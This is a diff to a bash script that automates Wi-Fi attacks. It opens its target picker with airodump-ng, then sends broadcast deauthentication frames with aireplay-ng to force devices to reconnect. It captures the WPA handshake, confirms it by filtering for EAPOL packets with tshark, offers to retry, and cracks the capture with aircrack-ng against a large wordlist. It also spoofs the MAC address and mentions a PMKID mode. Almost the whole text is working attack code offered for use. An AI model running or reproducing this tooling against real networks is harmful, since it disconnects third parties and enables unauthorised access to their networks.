@@ -81,7 +81,7 @@ function install_hcxdumptool(){
 }
 
 function dependencies(){
-    clear; programs=(aircrack-ng macchanger hcxdumptool hashcat)
+    clear; programs=(aircrack-ng macchanger hcxdumptool hashcat tshark)
 
     echo -e "${yellow}[*]${nc} Checking dependencies...\n"
     sleep 2
@@ -119,7 +119,7 @@ function dependencies(){
     sleep 1
 }
 
-function handshake(){
+function select_target_network(){
     xterm -hold -e "airodump-ng ${network_card}"&
     airodump_xterm_pid=$!
 
@@ -129,16 +129,33 @@ function handshake(){
     echo -ne "${yellow}[*]${nc} Enter the channel of the target network: " && read ap_channel
 
     kill -9 $airodump_xterm_pid; wait $airodump_xterm_pid &>/dev/null
+}
 
+function handshake(){
     xterm -hold -e "airodump-ng -c $ap_channel -w "capture_${ap_bssid}" --bssid "${ap_bssid}" ${network_card}"&
     airodump_filter_xterm_pid=$!
 
-    sleep 5; xterm -hold -e "aireplay-ng -0 15 -b "${ap_bssid}" -c ff:ff:ff:ff:ff:ff ${network_card}"&
+    sleep 5; xterm -hold -e "aireplay-ng -0 15 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"&
     aireplay_xterm_pid=$!
 
     sleep 10; kill -9 $aireplay_xterm_pid; wait $aireplay_xterm_pid &>/dev/null
 
-    sleep 30; kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
+    sleep 60 # Listen for 60 seconds
+
+    tshark -r capture_${ap_bssid}-01.cap -Y "eapol"
+
+    if [ "$(echo $?)" == "0" ]; then
+        echo -e "${green}[+]${nc} Handshake captured"
+        kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
+    else
+        echo -e "${red}[-]${nc} Handshake could not be captured"
+        echo -ne "${red}[-]${nc} Send s to stop listen [s]: " && read answer
+        kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
+        echo -ne "${yellow}[?]${nc} Do you want to try again? [y/n]: " && read answer
+        if [[ $answer == "y" ]]; then
+            handshake
+        fi
+    fi
 
     xterm -hold -e "aircrack-ng -w /usr/share/wordlist/kaonashiWPA100M.txt capture_${ap_bssid}-01.cap" &
 }
@@ -198,6 +215,7 @@ function attack(){
     echo -e "\n${green}[*]${nc} New MAC address: $macaddress\n"
 
     if [[ "${attack_mode,,}" == "handshake" ]]; then
+        select_target_network
         handshake
     elif [[ "${attack_mode,,}" == "pmkid" ]]; then
         pmkid
